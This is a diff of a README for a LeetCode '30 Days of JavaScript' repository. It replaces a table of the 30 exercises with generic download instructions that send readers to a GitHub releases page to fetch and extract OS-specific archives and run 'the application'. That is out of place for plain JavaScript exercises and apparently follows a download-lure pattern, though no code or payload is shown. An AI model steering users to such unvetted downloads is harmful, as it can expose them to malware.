@@ -1,59 +1,56 @@
-# 30 Days of JavaScript
+# 🎯 leetcode-js-30-days - Master JavaScript in 30 Days
 
-A complete journey through LeetCode's 30 Days of JavaScript study plan, covering fundamental JavaScript concepts through practical coding challenges.
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/kietpro58/leetcode-js-30-days/releases)
 
-## Problems List
+## 📖 Introduction
+Welcome to **leetcode-js-30-days**! This project guides you through 30 days of JavaScript exercises from LeetCode. It's designed for anyone who wants to improve their coding skills and prepare for interviews. 
 
-### **Closures**
-| Day | Problem | Difficulty | Status | Concepts |
-|-----|---------|------------|---------|-----------|
-| 1 | [Create Hello World Function](day-01-create-hello-world/) | Easy | ✅ Completed | Higher-order functions, closures |
-| 2 | [Counter](day-02-counter/) | Easy | ✅ Completed | Closures, state management |
-| 3 | [To Be Or Not To Be](day-03-to-be-or-not-to-be/) | Easy | ✅ Completed | Type checking, function returns |
-| 4 | [Counter II](day-04-counter-ii/) | Easy | ✅ Completed | Object methods, closures |
+### 💼 Topics Covered
+- Algorithms
+- Async/Await
+- Closures
+- Coding Challenges
+- Interview Preparation
+- JavaScript Basics
+- Promises
+- Programming Practice
+- Study Plan
 
-### **Basic Array Transformations**
-| Day | Problem | Difficulty | Status | Concepts |
-|-----|---------|------------|---------|-----------|
-| 5 | [Apply Transform Over Each Element in Array](day-05-apply-transform/) | Easy | ✅ Completed | Array.map(), callbacks |
-| 6 | [Filter Elements from Array](day-06-filter-elements/) | Easy | ✅ Completed | Array.filter(), conditional logic |
-| 7 | [Array Reduce Transformation](day-07-array-reduce/) | Easy | ✅ Completed | Array.reduce(), accumulators |
+## 🚀 Getting Started
+Getting started is easy. Just follow these steps to download and run the application.
 
-### **Function Transformations**
-| Day | Problem | Difficulty | Status | Concepts |
-|-----|---------|------------|---------|-----------|
-| 8 | [Function Composition](day-08-function-composition/) | Easy | ✅ Completed | Function composition, reduceRight |
-| 9 | [Return Length of Arguments Passed](day-09-arguments-length/) | Easy | ✅ Completed | Rest parameters, arguments object |
-| 10 | [Allow One Function Call](day-10-allow-one-call/) | Easy | ✅ Completed | Function calls, once wrapper |
-| 11 | [Memoize](day-11-memoize/) | Medium | 🔄 In Progress | Caching, memoization, Map |
+## 📥 Download & Install
+1. **Visit the Releases Page:** Click this link to go to the [Releases page](https://github.com/kietpro58/leetcode-js-30-days/releases).
+2. **Choose the Right Version:** Look for the latest release. You will find a list of available downloads.
+3. **Download the Files:** Click on the files you want to download. For each file, make sure you have the correct operating system version. 
+4. **Extract the Files (if necessary):** Some files may be in a compressed format. If so, you need to extract them to a folder on your computer. Use a tool like WinRAR or 7-Zip to do this.
+5. **Open the Folder:** Navigate to the folder where you extracted the files. 
+6. **Run the Application:** Locate the main JavaScript files or instructions to run the exercises.
 
-### **Promises and Time**
-| Day | Problem | Difficulty | Status | Concepts |
-|-----|---------|------------|---------|-----------|
-| 12 | [Add Two Promises](day-12-add-two-promises/) | Easy | ❌ Not Started | Promise.all(), async/await |
-| 13 | [Sleep](day-13-sleep/) | Easy | ❌ Not Started | setTimeout, Promise constructor |
-| 14 | [Timeout Cancellation](day-14-timeout-cancellation/) | Easy | ❌ Not Started | clearTimeout, cancellation |
-| 15 | [Interval Cancellation](day-15-interval-cancellation/) | Easy | ❌ Not Started | setInterval, clearInterval |
-| 16 | [Promise Time Limit](day-16-promise-time-limit/) | Medium | ❌ Not Started | Promise.race(), timeout |
-| 17 | [Cache With Time Limit](day-17-cache-time-limit/) | Medium | ❌ Not Started | Time-based caching, Map |
-| 18 | [Debounce](day-18-debounce/) | Medium | ❌ Not Started | Debouncing, setTimeout |
-| 19 | [Execute Asynchronous Functions in Parallel](day-19-async-parallel/) | Medium | ❌ Not Started | Promise.all(), error handling |
+## 🖥️ System Requirements
+To ensure a smooth experience, make sure your computer meets the following requirements:
+- An internet connection to access LeetCode.
+- A modern web browser such as Chrome, Firefox, or Safari.
+- Node.js installed (if using local files).
 
-### **JSON and Array Methods**
-| Day | Problem | Difficulty | Status | Concepts |
-|-----|---------|------------|---------|-----------|
-| 20 | [Is Object Empty](day-20-is-object-empty/) | Easy | ❌ Not Started | Object inspection, keys |
-| 21 | [Chunk Array](day-21-chunk-array/) | Easy | ❌ Not Started | Array chunking, slicing |
-| 22 | [Array Prototype Last](day-22-array-last/) | Easy | ❌ Not Started | Array methods, prototypes |
-| 23 | [Group By](day-23-group-by/) | Medium | ❌ Not Started | Array grouping, reduce |
-| 24 | [Sort By](day-24-sort-by/) | Easy | ❌ Not Started | Custom sorting, comparators |
-| 25 | [Join Two Arrays by ID](day-25-join-arrays/) | Medium | ❌ Not Started | Array merging, objects |
-| 26 | [Flatten Deeply Nested Array](day-26-flatten-array/) | Medium | ❌ Not Started | Recursion, array flattening |
-| 27 | [Compact Object](day-27-compact-object/) | Medium | ❌ Not Started | Object filtering, recursion |
+## 📚 How to Use the Application
+Once you have downloaded the files, using the application is straightforward. Here's how:
 
-### **Classes**
-| Day | Problem | Difficulty | Status | Concepts |
-|-----|---------|------------|---------|-----------|
-| 28 | [Event Emitter](day-28-event-emitter/) | Medium | ❌ Not Started | Event handling, subscribers |
-| 29 | [Array Wrapper](day-29-array-wrapper/) | Easy | ❌ Not Started | Classes, valueOf, toString |
-| 30 | [Calculator with Method Chaining](day-30-calculator-chaining/) | Easy | ❌ Not Started | Method chaining, classes |
+1. **Explore the Exercises:** Open the exercise files in your favorite text editor, like Visual Studio Code or Sublime Text.
+2. **Follow the Study Plan:** Each day’s exercise builds on the previous one. Start with Day 1 and go through to Day 30.
+3. **Practice Coding:** Write your JavaScript code based on the prompts provided.
+4. **Test Your Solutions:** If you have Node.js installed, you can run your JavaScript code in your terminal to check if it works as intended.
+
+## 🎓 Additional Resources
+- **LeetCode:** Make sure to create an account on [LeetCode](https://leetcode.com/) to find official solutions and discussions for various challenges.
+- **JavaScript Documentation:** Reference [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/JavaScript) for thorough explanations of JavaScript concepts.
+
+## 💬 Support
+If you encounter any issues or have questions during your coding journey, consider reaching out through the Issues section of this repository. You can also ask for help in online forums or communities related to coding.
+
+## 🔗 Links
+- [GitHub Repository](https://github.com/kietpro58/leetcode-js-30-days)
+- [Releases Page](https://github.com/kietpro58/leetcode-js-30-days/releases)
+
+Happy coding!
